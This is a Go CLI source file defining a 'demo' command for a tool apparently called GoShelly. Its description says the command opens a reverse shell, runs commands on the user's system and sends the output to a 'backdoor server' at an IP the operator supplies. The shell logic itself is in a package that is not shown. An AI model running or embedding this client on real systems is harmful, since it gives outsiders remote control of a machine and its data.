/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"fmt"
	b "goshelly-client/basic"
	"os"
	"strconv"

	"github.com/spf13/cobra"
)

// demoCmd represents the demo command
var demoCmd = &cobra.Command{
	Use:   "demo",
	Short: "Creates a reverse shell, few commands are run on your system externally and output sent to the backdoor server.",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		PORT, _ := cmd.Flags().GetString("PORT")
		if cmd.Flags().Changed("PORT") {
			_, portErr := strconv.ParseInt(PORT, 10, 64)
			if portErr != nil {
				fmt.Printf("PORT Error: Not a number.\n %s", portErr)
				os.Exit(1)
			}
		}
		if !cmd.Flags().Changed("SSLEMAIL") || !cmd.Flags().Changed("IP") {
			fmt.Println("One or more flags missing, IP and/or SSLEMAIL.")
			os.Exit(1)
		}
		SSLEMAIL, _ := cmd.Flags().GetString("SSLEMAIL")
		HOST, _ := cmd.Flags().GetString("IP")
		LOGMAX, _:= cmd.Flags().GetInt("LOGMAX")
		fmt.Println("Running GoShelly-DEMO")
		
		b.StartClient(HOST, PORT, SSLEMAIL, LOGMAX)
	},
}

func init() {
	rootCmd.AddCommand(demoCmd)
	rootCmd.PersistentFlags().String("PORT", "443", "PORT")
	rootCmd.PersistentFlags().String("IP", "", "Server IP")
	rootCmd.PersistentFlags().String("SSLEMAIL", "", "Email to generate SSL certificate.")
	rootCmd.PersistentFlags().Int("LOGMAX", 50, "Number of log files to keep")
}
